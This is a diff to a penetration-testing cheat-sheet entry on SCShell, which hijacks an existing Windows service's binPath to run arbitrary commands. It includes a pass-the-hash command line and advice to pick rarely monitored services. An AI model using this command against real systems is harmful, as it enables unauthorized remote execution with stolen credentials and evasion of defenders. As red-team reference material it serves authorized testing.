@@ -6,7 +6,7 @@ Stealthy alternative to psexec — reconfigures an existing service's binPath to
 
 Hijack `$service_name` (often `XblAuthManager` or `defragsvc` because they're start-on-demand and rarely monitored) to run `$cmd`.
 
-```sh title:"Hijack existing service binPath to run arbitrary command"
+```sh title:"SCShell Hijack existing service binPath to run arbitrary command"
 scshell.py -service-name $service_name -hashes :$nt_hash $domain/$user@$rhost_ip
 ```
 <!-- cheat
